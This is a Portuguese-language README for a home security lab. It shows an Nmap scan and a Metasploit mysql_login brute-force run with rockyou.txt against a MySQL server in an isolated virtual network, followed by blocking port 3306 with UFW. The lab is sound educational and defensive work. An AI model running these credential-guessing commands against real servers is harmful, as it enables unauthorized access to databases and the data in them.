# Laboratório de Segurança: Brute Force com Metasploit em MySQL + Mitigação com UFW

## Descrição

Este projeto demonstra, em ambiente controlado, uma simulação de **ataque de força bruta** contra um serviço **MySQL exposto**, seguido da aplicação de medidas de mitigação com **UFW (Uncomplicated Firewall)** para aumentar a segurança.

O objetivo é evidenciar como vulnerabilidades podem ser exploradas e, posteriormente, corrigidas através de técnicas de hardening.

---

## Objetivo

* Simular ataque de força bruta em MySQL
* Identificar credenciais válidas com Metasploit
* Estabelecer sessão ativa no banco de dados
* Aplicar mitigação com firewall (UFW)
* Evidenciar a diferença entre ambiente vulnerável e protegido

---

## Ambiente do Laboratório

| Máquina  | Sistema       | Função   |
| -------- | ------------- | -------- |
| Atacante | Kali Linux    | Pentest  |
| Alvo     | Ubuntu Server | Servidor |

* Virtualização: Hyper-V
* Rede: Interna (mesmo switch virtual)

---

## 🌐 Topologia da Rede

```bash
Kali Linux (Atacante)
        |
        |  Ataque Brute Force (Metasploit)
        v
Ubuntu Server (Alvo - MySQL)
        |
        |  Mitigação com UFW
        v
   Porta 3306 bloqueada
```

---

## Configuração do Cenário

### Estado inicial (vulnerável)

* Serviço MySQL ativo na porta 3306
* Acesso externo permitido
* Usuário e senha configurados no banco
* Sem restrições de firewall

---

## Ataque (Brute Force com Metasploit)

### 1. Enumeração com Nmap

Identificação do serviço MySQL exposto:

```bash
nmap -p 3306 <IP_DO_ALVO>
```

Resultado: Porta 3306 aberta

---

### 2. Ataque de força bruta com Metasploit

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <IP_DO_ALVO>
set PASS_FILE rockyou.txt
set CreateSession true
run
```

### Detalhes do ataque:

* Múltiplas tentativas de login realizadas
* Credenciais válidas encontradas com sucesso

---

### 3. Acesso ao banco via sessão

```bash
sessions -i
```

Resultado: Sessão MySQL aberta com sucesso, acesso autenticado ao banco de dados.

---

### 4. Acesso direto ao MySQL (opcional)

```bash
mysql -u usuario -p -h <IP_DO_ALVO>
```

---

## Defesa (Mitigação com UFW)

Bloqueio da porta com UFW:

```bash
sudo ufw deny 3306/tcp
```

Após aplicar a regra:

* Porta 3306 bloqueada
* Conexões externas negadas

---

## Resultados

| Situação | Resultado                      |
| -------- | ------------------------------ |
| Antes    | Acesso não autorizado possível |
| Depois   | Acesso bloqueado com sucesso   |

---

## Evidências

* Scan do Nmap mostrando porta 3306 aberta
* Execução do Metasploit (brute force)
* Credenciais encontradas
* Sessão aberta (MySQL session opened)
* Regra do UFW aplicada
* Tentativa de conexão falhando após bloqueio

---

## Análise

* Serviços expostos sem restrição representam alto risco
* Autenticação fraca facilita ataques de brute force
* O Metasploit é eficaz para testes de segurança ofensiva
* O UFW fornece uma defesa simples e eficiente

---

## Aprendizados

* Identificação de serviços expostos
* Exploração de autenticação fraca
* Uso do Metasploit para testes de segurança
* Estabelecimento de sessão ativa em serviço comprometido
* Aplicação de hardening básico com firewall (UFW)
* Importância da restrição de acesso a serviços sensíveis

---

## Melhorias Futuras

* Implementar Fail2Ban para proteção contra brute force
* Restringir acesso ao MySQL por IP
* Utilizar autenticação mais forte (senhas complexas)
* Monitorar logs de acesso
* Aplicar regras mais avançadas de firewall

---

## ⚠️ Aviso

Este projeto foi realizado **apenas para fins educacionais**, em ambiente controlado.
Não realize testes em sistemas sem autorização.

---

## Autor

Wladimir Eduardo
Entusiasta de Cibersegurança
